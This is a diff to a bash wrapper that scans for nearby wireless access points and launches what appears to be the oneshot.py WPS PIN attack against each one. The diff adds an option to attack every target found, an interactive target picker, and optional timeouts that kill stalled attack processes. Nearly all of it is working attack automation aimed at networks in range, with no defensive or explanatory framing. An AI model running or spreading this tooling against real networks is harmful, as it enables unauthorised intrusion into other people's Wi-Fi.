@@ -5,6 +5,7 @@ function usage()
 	echo "Usage: $(basename $0) [options]"
 	echo -e "-t <time>      \tScan timeout in seconds"
 	echo -e "-i <interface> \tInterface name"
+	echo -e "-a             \tAttack all targets"
 	echo -e "-h             \tShow this help"
 	exit
 }
@@ -12,13 +13,15 @@ function usage()
 TIMEOUT=30
 IFACE="wlan0"
 
-while getopts "t:i:h" opt
+while getopts "t:i:ha" opt
 do
 	case $opt in
 		t)
 			TIMEOUT=${OPTARG};;
 		i)
 			IFACE=${OPTARG};;
+		a)
+			ALL="1";;
 		h)
 			usage;;
 		*)
@@ -55,27 +58,48 @@ done
 
 for TARGET in ${!BSSIDS[@]}
 do
-	echo -e "[+] ${BSSIDS[$TARGET]}\t${ESSIDS[$TARGET]}"
+	echo -e "[$((${TARGET}+1))] ${BSSIDS[$TARGET]}\t${ESSIDS[$TARGET]}"
 done
 
-for TARGET in ${!BSSIDS[@]}
+if [ ! $ALL ]
+then
+	echo -n "[*] Choose targets to attack (space separated) or 'all': "
+	read CHOSEN
+fi
+
+if [ $CHOSEN = "all" ] || [ $ALL ]
+then
+	echo "[*] Attacking all targets!"
+	CHOSEN=${!BSSIDS[@]}
+	ALL="1"
+fi
+
+
+for TARGET in $CHOSEN
 do
+	if [ ! $ALL ]
+	then
+		TARGET=$(($TARGET-1))
+	fi
 	echo
 	echo "[+] Shooting ${BSSIDS[$TARGET]} - ${ESSIDS[$TARGET]}"
 	python oneshot.py --bssid ${BSSIDS[$TARGET]} -K -F -i $IFACE -w 2>/dev/null || true && killall sleep 2> /dev/null &
-	sleep $TIMEOUT > /dev/null && echo "[-] Timeout!"
 	
-	PIDS="1"
-	while [ "$PIDS" ]
-	do
-		PIDS=$(ps -ux | grep oneshot.py | grep -v grep | awk '{print $2}')
-		for PID in $PIDS
+	if [ $TIMEOUT -gt 0 ]
+	then
+		sleep $TIMEOUT > /dev/null && echo "[-] Timeout!"
+		PIDS="1"
+		while [ "$PIDS" ]
 		do
-			kill -9 $PID > /dev/null
-			echo "[*] Killed oneshot process"
+			PIDS=$(ps -ux | grep oneshot.py | grep -v grep | awk '{print $2}')
+			for PID in $PIDS
+			do
+				kill -9 $PID > /dev/null
+				echo "[*] Killed oneshot process"
+			done
+			sleep 1
 		done
-		sleep 1
-	done
+	fi
 
 	wait
 done
